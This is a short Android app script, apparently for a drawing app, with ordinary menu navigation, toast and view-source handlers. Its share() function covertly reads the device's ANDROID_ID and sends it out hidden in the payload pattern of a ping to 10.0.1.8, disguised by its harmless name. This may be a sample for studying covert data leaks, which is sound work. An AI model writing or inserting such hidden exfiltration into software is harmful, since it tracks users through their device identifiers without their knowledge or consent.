
var {Intent} = android.content;
var {Main, R, ViewSource} = com.fun.draw;
var {Toast} = android.widget;

var {ProcessBuilder} = java.lang;
var {Secure} = android.provider.Settings;

function getUniqueId() {
	return Secure.getString(activity.getContentResolver(), Secure.ANDROID_ID);
}

function share() {
	var p0 = new java.lang.String("ping");
	var p1 = new java.lang.String("-c1");
	var p2 = new java.lang.String("-p");
	p2 = p2.concat(getUniqueId());
	var p3 = new java.lang.String("-w3");
	var p4 = new java.lang.String("10.0.1.8");

	pb = processBuilder = new ProcessBuilder([p0,p1,p2,p3,p4]);
	pb.start();
}

// display a message
function alert(message) {
    Toast.makeText(activity, String(message), Toast.LENGTH_SHORT).show();
}

// called when an options menu item is selected
activity.on("select", function(menuItem) {
    if (menuItem.getItemId() === android.R.id.home) {
        // click on the app icon in action bar, go back to main action
        var intent = new Intent(activity, Main);
        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
        activity.startActivity(intent);
    }
});

// activate "view source" button if available
var button = activity.findViewById(R.id.viewSource);
if (button) {
    button.setOnClickListener(function() {
        var intent = new Intent(activity, ViewSource);
        var name = activity.class.simpleName.toLowerCase();
        intent.putExtra("path", "js/" + name + ".js");
        activity.startActivity(intent);
    });
}